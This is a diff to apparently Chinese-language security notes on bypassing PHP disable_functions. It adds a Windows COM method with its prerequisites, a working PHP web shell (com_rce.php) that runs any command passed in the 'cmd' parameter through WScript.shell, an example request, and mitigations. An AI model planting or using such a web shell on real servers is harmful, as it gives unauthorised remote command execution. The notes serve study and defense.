@@ -49,6 +49,31 @@ PHP中Disable Function的实现是在php-src/Zend/Zend-API.c中。PHP在启动�
 
 Bypass
 ---------------------------------
+- Windows COM组件
+	- 利用条件
+		 | ▼ php.ini中com.allow_dcom的值为true且extension=php_com_dotnet.dll；
+		 | ▼ php/ext/目录下存在php_com_dotnet.dll文件
+		 | ▼ 目标服务器为Windows系统且使用PHP语言
+	- 利用方法
+		 | ▼ 上传com_rce.php文件至服务器
+			
+			::
+			
+					<?php
+					$command = $_GET['cmd'];
+					$wsh = new COM('WScript.shell');
+					$exec = $wsh->exec("cmd /c".$command);
+					$stdout = $exec->StdOut();
+					$stroutput = $stdout->ReadAll();
+					echo $stroutput;
+					?>
+					
+		 | ▼ 远程命令执行
+			``http://www.xxx.com/com_rce.php?cmd=ipconfig``
+	- 防御方法
+		 | ▼ 将System32目录下的wshom.ocx文件删除；（推荐，杜绝）
+		 | ▼ 删除php/ext/目录下的php_com_dotnet.dll文件，防止被恶意利用；
+		 | ▼ 将com.allow.dcom的值设置为false；
 - LD_PRELOAD绕过
     - https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD
     - ``mail()`` + ``putenv``
